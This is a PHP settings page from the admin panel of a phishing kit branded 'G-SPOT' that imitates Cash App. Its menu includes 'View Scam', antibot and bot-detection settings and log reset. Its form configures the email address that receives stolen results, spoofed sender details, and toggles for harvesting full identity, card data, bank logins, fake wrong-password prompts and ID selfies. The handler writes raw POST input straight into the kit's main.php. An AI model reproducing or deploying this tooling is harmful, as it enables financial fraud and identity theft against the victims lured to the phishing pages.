<?php 
session_start();
include '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" name="viewport">
  <link rel="shortcut icon" class="iconify" data-icon="simple-icons:cashapp">
  <title>G-SPOT - SETTING</title>

  <!-- General CSS Files -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css">

  <!-- Template CSS -->
  <link rel="stylesheet" href="css/style.css">
  <link rel="stylesheet" href="css/components.css">
  <script src="https://code.iconify.design/1/1.0.7/iconify.min.js"></script>
</head>

<body>
  <div id="app">
    <div class="main-wrapper">
    <div class="navbar-bg"></div>
      <nav class="navbar navbar-expand-lg main-navbar">
        <div class="mr-auto">
          <ul class="navbar-nav mr-3">
            <li><a href="#" data-toggle="sidebar" class="nav-link nav-link-lg"><i class="fas fa-bars"></i></a></li>
          </ul>
        </div>
        <ul class="navbar-nav navbar-right ml-auto">
          <li class="dropdown"><a href="#" data-toggle="dropdown" class="nav-link dropdown-toggle nav-link-lg nav-link-user">
            <div class="d-sm-none d-lg-inline-block">G-SPOT</div></a>
            <div class="dropdown-menu dropdown-menu-right">
            <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?= $param ?>" class="dropdown-item has-icon">
                <i class="fas fa-user"></i> Go to G-SPOT panel
              </a>
              <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?= $param ?>" class="dropdown-item has-icon">
                <i class="fas fa-user-lock"></i> View Scam
              </a>
            <!--  <a href="logout.php" class="dropdown-item has-icon">
                <i class="fas fa-sign-out-alt"></i> Logout
              </a> -->
            </div>
          </li>
        </ul>
      </nav>
      <div class="main-sidebar">
        <aside id="sidebar-wrapper">
          <div class="sidebar-brand">
            <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/" style="color: #000000;"><i class="iconify" data-icon="simple-icons:cashapp"></i> G-SPOT.Inc</a>
          </div>
          <div class="sidebar-brand sidebar-brand-sm">
            <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>"><i class="iconify" data-icon="simple-icons:cashapp"></i></a>
          </div>
          <ul class="sidebar-menu">
              <li><a class="nav-link" href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/panel"><i class="fas fa-home"></i> <span>Dashboard</span></a></li>
              <li><a class="nav-link" href="settings.php"><i class="fas fa-cogs"></i> <span>Settings</span></a></li>
              <li><a class="nav-link" href="killbot.php"><i class="fas fa-robot"></i> <span>Antibot Setting</span></a></li>
              <li><a class="nav-link" href="bot.php"><i class="fas fa-bug"></i> <span>Bot Detect</span></a></li>
              <li><a class="nav-link" href="reset.php"><i class="fas fa-trash-alt"></i> <span>Reset Logs</span></a></li>
            </ul>
        </aside>
      </div>
      <!-- Main Content -->
      <div class="main-content">
        <section class="section">
          <div class="section-header">
            <h1>Settings</h1>
          </div>
        <div class="section-body">
            <div class="row">
          <div class="col-md-12">
            <div class="card ">
              <div class="card-body ">
              <font color="red"><b>Note</b> : Please follow the rules for filling out the form</font><br>
              <font color="red"><b>Theme</b>  [ SMART PAGE ] : Full Identity = YUPS, Billing -> Card = normal , Card - Billing ( only cc ) : hanyacc</font>
                <form action="" method="post" class="form-horizontal">
                <table class="table">
                  <thead class="text-danger">
                    <tr>
                      <td><strong>NAME</strong></td>
                      <td><strong>NEW</strong></td>
                      <td><strong>OLD</strong></td>
                      <td><strong>ACTION</strong></td>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td>
                        <strong>EMAIL RESULT</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="emailresultbaru" class="form-control" placeholder="example@domain.com">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="emailresultlama" readonly value="<?= $setting['email']; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="email" class="btn btn-danger btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
					<tr>
                      <td>
                        <strong>SENDER NAME</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="sendernamebaru" class="form-control" placeholder="<?= $setting['sendername']; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="sendernamelama" readonly value="<?= $setting['sendername']; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="newsenderlogin" class="btn btn-danger btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
					<tr>
                      <td>
                        <strong>SENDER EMAIL</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="senderemailbaru" class="form-control" placeholder="<?= $setting['senderemail']; ?>">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="senderemaillama" readonly value="<?= $setting['senderemail']; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="newsenderemail" class="btn btn-danger btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>RANDOM PARAMETER</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="randomb" class="form-control" placeholder="on / off">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="randoml" readonly value="<?= $setting['random_parameter']; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="newparameter" class="btn btn-danger btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
					<tr>
                      <td>
                        <strong>SMART EMAIL ACCESS</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="smartb" class="form-control" placeholder="YES / NO">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="smartl" readonly value="<?= $setting['fake_wrongpass']; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="smartlogin" class="btn btn-danger btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>SMART PAGE</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="addressb" class="form-control" placeholder="YUPS / normal / hanyacc">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="addressl" readonly value="<?= $setting['with_address']; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="alamat" class="btn btn-danger btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
          <tr>
                      <td>
                        <strong>GET BANK</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="bankb" class="form-control" placeholder="YEPS / NOPS">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="bankl" readonly value="<?= $setting['with_bank']; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="bankacc" class="btn btn-danger btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>GET IDENTITY</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="getselfiebaru" class="form-control" placeholder="Active / NO">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="getselfielama" readonly value="<?= $setting['upload_id']; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="get_selfie" class="btn btn-danger btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                  </tbody>
                    </table>
                  </div>
                </div>
              </div>
        </section>
        <script language="JavaScript1.2">
var message=" G - S P O T . I n c"
var neonbasecolor="black"
var neontextcolor="gold"
var neontextcolor2="lime"
var neontexsize="8"
var flashspeed=50 
var flashingletters=2 
var flashingletters2=15 
var flashpause=0  
///No need to edit below this line/////
var n=0
if (document.all||document.getElementById){
document.write('<b>')
document.write('<font color="'+neonbasecolor+neontexsize+'">')
for (m=0;m<message.length;m++)
document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
document.write('</font>')
document.write('</b>')
}
else
document.write(message)
function crossref(number){
var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
return crossobj
}
function neon(){
//Change all letters to base color
if (n==0){
for (m=0;m<message.length;m++)
crossref(m).style.color=neonbasecolor
}
//cycle through and change individual letters to neon color
crossref(n).style.color=neontextcolor
if (n>flashingletters-1) crossref(n-flashingletters).style.color=neontextcolor2
if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=neonbasecolor
if (n<message.length-1)
n++
else{
n=0
clearInterval(flashing)
setTimeout("beginneon()",flashpause)
return
}
}
function beginneon(){
if (document.all||document.getElementById)
flashing=setInterval("neon()",flashspeed)
}
beginneon()
</script>
      </div>
      	<footer class="main-footer">
        <div class="text-center text-dark"><p>きみ の こと が すき だから</p></div>
    </footer>
    </div>
  </div>

  <!-- General JS Scripts -->
  <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.nicescroll/3.7.6/jquery.nicescroll.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment.min.js"></script>
  <script src="js/stisla.js"></script>

  <!-- Template JS File -->
  <script src="js/sweetalert.min.js"></script>
  <script src="js/scripts.js"></script>
  <script src="js/custom.js"></script>

</body>
</html>
<?php
    $parameterlama         = trim($_POST['parameterlama']);
    $parameterbaru         = trim($_POST['parameterbaru']);
    $emailresultlama         = trim($_POST['emailresultlama']);
    $emailresultbaru         = trim($_POST['emailresultbaru']);
    $sendernamelama         = trim($_POST['sendernamelama']);
    $sendernamebaru         = trim($_POST['sendernamebaru']);
    $senderemaillama         = trim($_POST['senderemaillama']);
    $senderemailbaru         = trim($_POST['senderemailbaru']);
  	$bankl      = trim($_POST['bankl']);
    $bankb      = trim($_POST['bankb']);
	  $smartl      = trim($_POST['smartl']);
    $smartb      = trim($_POST['smartb']);
    $addressl      = trim($_POST['addressl']);
    $addressb      = trim($_POST['addressb']);
    $getselfielama         = trim($_POST['getselfielama']);
    $getselfiebaru         = trim($_POST['getselfiebaru']);
    $randoml      = trim($_POST['randoml']);
    $randomb      = trim($_POST['randomb']);
    $file         = "../main.php";
    $isi          = file_get_contents($file);
 
if(isset($_POST['newparameter'])) {
    if(preg_match("#\b$randoml\b#is", $isi)) {
        $isi = str_replace($randoml,$randomb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
        echo "<meta http-equiv='refresh' content='3; url=settings.php'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['email'])) {
    if(preg_match("#\b$emailresultlama\b#is", $isi)) {
        $isi = str_replace($emailresultlama,$emailresultbaru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
        echo "<meta http-equiv='refresh' content='3; url=settings.php'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['newsenderlogin'])) {
    if(preg_match("#\b$sendernamelama\b#is", $isi)) {
        $isi = str_replace($sendernamelama,$sendernamebaru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
        echo "<meta http-equiv='refresh' content='3; url=settings.php'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['newsenderemail'])) {
    if(preg_match("#\b$senderemaillama\b#is", $isi)) {
        $isi = str_replace($senderemaillama,$senderemailbaru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
        echo "<meta http-equiv='refresh' content='3; url=settings.php'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['bankacc'])) {
   if(preg_match("#$bankl#is", $isi)) {
        $isi = str_replace($bankl,$bankb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
        echo "<meta http-equiv='refresh' content='3; url=settings.php'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['smartlogin'])) {
   if(preg_match("#$smartl#is", $isi)) {
        $isi = str_replace($smartl,$smartb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
        echo "<meta http-equiv='refresh' content='3; url=settings.php'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['alamat'])) {
    if(preg_match("#\b$addressl\b#is", $isi)) {
        $isi = str_replace($addressl,$addressb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
        echo "<meta http-equiv='refresh' content='3; url=settings.php'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}elseif(isset($_POST['get_selfie'])) {
    if(preg_match("#\b$getselfielama\b#is", $isi)) {
        $isi = str_replace($getselfielama,$getselfiebaru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script>swal ( 'Info!' ,  'Success Change! Waiting for 3 second for auto refresh page' ,  'success' )</script>";
        echo "<meta http-equiv='refresh' content='3; url=settings.php'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
?>